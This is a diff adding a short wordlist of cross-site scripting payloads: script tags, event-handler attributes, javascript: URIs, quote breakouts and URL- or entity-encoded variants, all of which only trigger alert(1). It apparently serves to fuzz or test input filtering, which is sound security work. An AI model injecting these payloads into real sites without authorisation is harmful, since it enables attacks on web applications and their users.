@@ -1,0 +1,25 @@
+# XSS payloads
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<svg onload=alert(1)>
+<img src=x onerror=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<details ontoggle=alert(1)>
+<video><source onerror=javascript:alert(1)>
+<audio src=x onerror=javascript:alert(1)>
+<iframe src="javascript:alert(1)">
+<svg><script>alert(1)</script>
+"><script>alert(1)</script>
+'"><script>alert(1)</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Csvg%20onload%3Dalert(1)%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+alert(1)
+javascript:alert(1)
+constructor.constructor('alert(1)')()
+"alert(1)
+&#x61;lert(1)
+&#97;lert(1)
